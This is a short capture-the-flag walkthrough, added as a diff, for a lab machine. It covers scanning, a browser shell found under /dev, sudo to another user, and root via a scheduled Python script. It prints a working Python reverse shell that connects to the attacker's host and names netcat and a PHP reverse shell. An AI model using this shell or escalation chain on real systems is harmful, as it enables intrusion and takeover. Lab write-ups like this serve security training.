@@ -1,0 +1,31 @@
+1. Nmap to 10.10.10.68 , only port 80 and 443 are open
+2. Also do gobuster scan , we have found dev and uploads folder
+3. goto /dev and we found /dev/php.bash => it gives us direct shell from browser
+4. Use LinEnum.sh and found initial user www-data can run commands as "scriptmanager" 
+user without password
+5. Now we try to use pentest-monkey's php-reverse-shell.php => Change IP and port
+listed to netcat and get an interactive shell
+6. now use "sudo -u scriptmanager" => user changed to script manager
+7. run ls -la command to check permissions => the current user haave -r-w-x
+permission of  "scripts" directory
+8. cd to scripts directory and ls -la => 2 files test.py(owned by scriptmanager)
+test.txt(owned by root)
+9. On cat test.py => python program writes to test.txt and test.py is scheduled
+to run every 1 minute
+10. Now create test.py in our kali-linux and paste the below content
+(modify IP and port based on machine)
+
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.9",8888))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
+11. change file permission to "chmod 777 test.py" => rwx for everyone
+12. transfer this file to target folder "scripts"
+13. once test.py sits in there, it automatically executes gives us root in 
+nc listenter in Kali 
+
+References => Rana khalil gitbook, pentestmonkey for php-revershell.php
